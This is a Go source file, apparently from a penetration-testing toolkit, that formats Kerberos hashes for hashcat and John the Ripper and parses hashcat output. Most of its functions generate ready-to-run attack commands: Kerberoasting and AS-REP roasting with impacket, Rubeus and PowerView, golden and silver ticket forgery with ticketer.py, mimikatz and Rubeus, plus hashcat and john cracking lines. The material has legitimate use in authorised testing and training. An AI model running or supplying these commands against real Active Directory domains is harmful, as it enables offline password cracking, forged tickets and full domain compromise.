package kerberos

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"regexp"
	"strings"
	"time"
)

// KerberosTicket represents a Kerberos ticket
type KerberosTicket struct {
	Type       string // TGT, TGS, AS-REP
	Username   string
	Domain     string
	SPN        string
	EncType    int
	Hash       string
	Cipher     []byte
	ExpiryTime time.Time
}

// SPNEntry represents a Service Principal Name
type SPNEntry struct {
	Username string
	SPN      string
	Domain   string
}

// ASREPEntry represents an AS-REP roastable user
type ASREPEntry struct {
	Username string
	Domain   string
	Hash     string
}

// EncryptionTypes
var EncryptionTypes = map[int]string{
	17: "AES128-CTS-HMAC-SHA1-96",
	18: "AES256-CTS-HMAC-SHA1-96",
	23: "RC4-HMAC",
	24: "RC4-HMAC-EXP",
}

// FormatHashcat formats ticket for hashcat
func FormatHashcat(ticket *KerberosTicket) string {
	switch ticket.Type {
	case "TGS", "Kerberoast":
		// Hashcat mode 13100 (Kerberos 5 TGS-REP etype 23)
		// Format: $krb5tgs$23$*user$realm$spn*$hash
		return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s",
			ticket.EncType, ticket.Username, ticket.Domain, ticket.SPN, ticket.Hash)

	case "AS-REP", "asrep":
		// Hashcat mode 18200 (Kerberos 5 AS-REP etype 23)
		// Format: $krb5asrep$23$user@domain:hash
		return fmt.Sprintf("$krb5asrep$%d$%s@%s:%s",
			ticket.EncType, ticket.Username, ticket.Domain, ticket.Hash)

	default:
		return ticket.Hash
	}
}

// FormatJohn formats ticket for John the Ripper
func FormatJohn(ticket *KerberosTicket) string {
	switch ticket.Type {
	case "TGS", "Kerberoast":
		return fmt.Sprintf("$krb5tgs$%d$%s$%s$*%s*$%s",
			ticket.EncType, ticket.Username, ticket.Domain, ticket.SPN, ticket.Hash)

	case "AS-REP", "asrep":
		return fmt.Sprintf("$krb5asrep$%d$%s@%s:%s",
			ticket.EncType, ticket.Username, ticket.Domain, ticket.Hash)

	default:
		return ticket.Hash
	}
}

// ParseKirbiFile parses a .kirbi file (simplified)
func ParseKirbiFile(data []byte) (*KerberosTicket, error) {
	// Kirbi files are ASN.1 encoded
	// This is a simplified parser
	ticket := &KerberosTicket{}

	// Check for kirbi magic bytes
	if len(data) < 4 || data[0] != 0x76 {
		return nil, fmt.Errorf("invalid kirbi format")
	}

	// Extract basic info (simplified)
	ticket.Type = "TGS"
	ticket.Hash = hex.EncodeToString(data)

	return ticket, nil
}

// ParseHashcatOutput parses hashcat Kerberos hash output
func ParseHashcatOutput(line string) (*KerberosTicket, error) {
	ticket := &KerberosTicket{}

	// TGS format: $krb5tgs$23$*user$realm$spn*$hash
	tgsPattern := regexp.MustCompile(`\$krb5tgs\$(\d+)\$\*([^$]+)\$([^$]+)\$([^*]+)\*\$(.+)`)
	if matches := tgsPattern.FindStringSubmatch(line); len(matches) == 6 {
		_, _ = fmt.Sscanf(matches[1], "%d", &ticket.EncType)
		ticket.Username = matches[2]
		ticket.Domain = matches[3]
		ticket.SPN = matches[4]
		ticket.Hash = matches[5]
		ticket.Type = "TGS"
		return ticket, nil
	}

	// AS-REP format: $krb5asrep$23$user@domain:hash
	asrepPattern := regexp.MustCompile(`\$krb5asrep\$(\d+)\$([^@]+)@([^:]+):(.+)`)
	if matches := asrepPattern.FindStringSubmatch(line); len(matches) == 5 {
		_, _ = fmt.Sscanf(matches[1], "%d", &ticket.EncType)
		ticket.Username = matches[2]
		ticket.Domain = matches[3]
		ticket.Hash = matches[4]
		ticket.Type = "AS-REP"
		return ticket, nil
	}

	return nil, fmt.Errorf("unrecognized format")
}

// GenerateKerberoastCommand generates commands for Kerberoasting
func GenerateKerberoastCommand(domain, username, password, dc string, tool string) string {
	switch tool {
	case "impacket":
		return fmt.Sprintf("python3 GetUserSPNs.py %s/%s:%s -dc-ip %s -request",
			domain, username, password, dc)

	case "rubeus":
		return fmt.Sprintf("Rubeus.exe kerberoast /domain:%s /dc:%s /creduser:%s /credpassword:%s",
			domain, dc, username, password)

	case "powerview":
		return "Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash"

	default:
		return fmt.Sprintf("GetUserSPNs.py %s/%s:%s -dc-ip %s -request",
			domain, username, password, dc)
	}
}

// GenerateASREPRoastCommand generates commands for AS-REP roasting
func GenerateASREPRoastCommand(domain, usersFile, dc string, tool string) string {
	switch tool {
	case "impacket":
		return fmt.Sprintf("python3 GetNPUsers.py %s/ -usersfile %s -dc-ip %s -format hashcat",
			domain, usersFile, dc)

	case "rubeus":
		return fmt.Sprintf("Rubeus.exe asreproast /domain:%s /dc:%s /format:hashcat",
			domain, dc)

	case "powerview":
		return "Get-DomainUser -PreauthNotRequired | Get-ASREPHash"

	default:
		return fmt.Sprintf("GetNPUsers.py %s/ -usersfile %s -dc-ip %s -format hashcat",
			domain, usersFile, dc)
	}
}

// GenerateGoldenTicketCommand generates golden ticket commands
func GenerateGoldenTicketCommand(domain, domainSID, krbtgtHash, username string, tool string) string {
	switch tool {
	case "impacket":
		return fmt.Sprintf("python3 ticketer.py -nthash %s -domain-sid %s -domain %s %s",
			krbtgtHash, domainSID, domain, username)

	case "mimikatz":
		return fmt.Sprintf("kerberos::golden /domain:%s /sid:%s /rc4:%s /user:%s /ticket:golden.kirbi",
			domain, domainSID, krbtgtHash, username)

	case "rubeus":
		return fmt.Sprintf("Rubeus.exe golden /domain:%s /sid:%s /rc4:%s /user:%s /ptt",
			domain, domainSID, krbtgtHash, username)

	default:
		return fmt.Sprintf("ticketer.py -nthash %s -domain-sid %s -domain %s %s",
			krbtgtHash, domainSID, domain, username)
	}
}

// GenerateSilverTicketCommand generates silver ticket commands
func GenerateSilverTicketCommand(domain, domainSID, serviceHash, spn, username string, tool string) string {
	switch tool {
	case "impacket":
		return fmt.Sprintf("python3 ticketer.py -nthash %s -domain-sid %s -domain %s -spn %s %s",
			serviceHash, domainSID, domain, spn, username)

	case "mimikatz":
		return fmt.Sprintf("kerberos::golden /domain:%s /sid:%s /rc4:%s /user:%s /service:%s /target:%s /ticket:silver.kirbi",
			domain, domainSID, serviceHash, username, strings.Split(spn, "/")[0], strings.Split(spn, "/")[1])

	default:
		return fmt.Sprintf("ticketer.py -nthash %s -domain-sid %s -domain %s -spn %s %s",
			serviceHash, domainSID, domain, spn, username)
	}
}

// DecodeKirbiBase64 decodes base64 encoded kirbi
func DecodeKirbiBase64(encoded string) ([]byte, error) {
	return base64.StdEncoding.DecodeString(encoded)
}

// DisplayTicket displays Kerberos ticket information
func DisplayTicket(ticket *KerberosTicket) {
	fmt.Fprintf(stdoutW, "\n[KERBEROS TICKET]\n")
	fmt.Fprintln(stdoutW, strings.Repeat("=", 50))
	fmt.Fprintf(stdoutW, "Type:       %s\n", ticket.Type)
	fmt.Fprintf(stdoutW, "Username:   %s\n", ticket.Username)
	fmt.Fprintf(stdoutW, "Domain:     %s\n", ticket.Domain)
	if ticket.SPN != "" {
		fmt.Fprintf(stdoutW, "SPN:        %s\n", ticket.SPN)
	}
	if encName, ok := EncryptionTypes[ticket.EncType]; ok {
		fmt.Fprintf(stdoutW, "Encryption: %s (etype %d)\n", encName, ticket.EncType)
	} else {
		fmt.Fprintf(stdoutW, "Encryption: etype %d\n", ticket.EncType)
	}

	fmt.Fprintln(stdoutW, "\nHashcat format:")
	fmt.Fprintf(stdoutW, "  %s\n", FormatHashcat(ticket))

	fmt.Fprintln(stdoutW, "\nJohn format:")
	fmt.Fprintf(stdoutW, "  %s\n", FormatJohn(ticket))

	fmt.Fprintln(stdoutW)
}

// DisplayKerberoastHelp displays Kerberoasting help
func DisplayKerberoastHelp(domain, dc string) {
	fmt.Fprintln(stdoutW, "\n[KERBEROAST COMMANDS]")
	fmt.Fprintln(stdoutW, strings.Repeat("=", 50))

	tools := []string{"impacket", "rubeus", "powerview"}
	for _, tool := range tools {
		cmd := GenerateKerberoastCommand(domain, "<user>", "<pass>", dc, tool)
		fmt.Fprintf(stdoutW, "\n%s:\n  %s\n", tool, cmd)
	}

	fmt.Fprintln(stdoutW, "\nCracking:")
	fmt.Fprintln(stdoutW, "  hashcat -m 13100 hashes.txt wordlist.txt")
	fmt.Fprintln(stdoutW, "  john --format=krb5tgs hashes.txt --wordlist=wordlist.txt")

	fmt.Fprintln(stdoutW)
}

// DisplayASREPHelp displays AS-REP roasting help
func DisplayASREPHelp(domain, dc string) {
	fmt.Fprintln(stdoutW, "\n[AS-REP ROAST COMMANDS]")
	fmt.Fprintln(stdoutW, strings.Repeat("=", 50))

	tools := []string{"impacket", "rubeus", "powerview"}
	for _, tool := range tools {
		cmd := GenerateASREPRoastCommand(domain, "users.txt", dc, tool)
		fmt.Fprintf(stdoutW, "\n%s:\n  %s\n", tool, cmd)
	}

	fmt.Fprintln(stdoutW, "\nCracking:")
	fmt.Fprintln(stdoutW, "  hashcat -m 18200 hashes.txt wordlist.txt")
	fmt.Fprintln(stdoutW, "  john --format=krb5asrep hashes.txt --wordlist=wordlist.txt")

	fmt.Fprintln(stdoutW)
}
